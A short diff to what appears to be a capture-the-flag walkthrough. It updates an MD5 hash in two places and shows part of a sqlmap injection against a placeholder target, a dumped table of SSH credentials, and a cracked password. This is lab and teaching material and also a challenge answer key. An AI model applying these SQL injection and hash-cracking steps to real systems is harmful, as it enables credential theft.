@@ -57,7 +57,7 @@ sqlmap -u "http://TARGET:5000/level/2/search?search=test" \
 **Key discovery:** The `ssh_credentials` table contains:
 | hostname | username | password_hash | type |
 |----------|----------|---------------|------|
-| nexus-internal-srv | sysop | `5b09b6e080c821e463c2b48bc81540f3` | MD5 |
+| nexus-internal-srv | sysop | `98ae336a33cb54a3d5effde7f32c06c8` | MD5 |
 | nexus-backup-srv | backup | `a67c4d15c47b4899e4a71024acf4aaa2` | MD5 |
 | nexus-dev-srv | devops | (SHA256 hash) | SHA256 |
 
@@ -71,7 +71,7 @@ The flag must be submitted manually — it's not auto-returned by SQLi.
 
 **Solution:** Crack the MD5 hash for the `sysop` account.
 
-**Hash:** `5b09b6e080c821e463c2b48bc81540f3`
+**Hash:** `98ae336a33cb54a3d5effde7f32c06c8`
 **Password:** `Op3r4t0r!`
 
 **With Hashcat:**
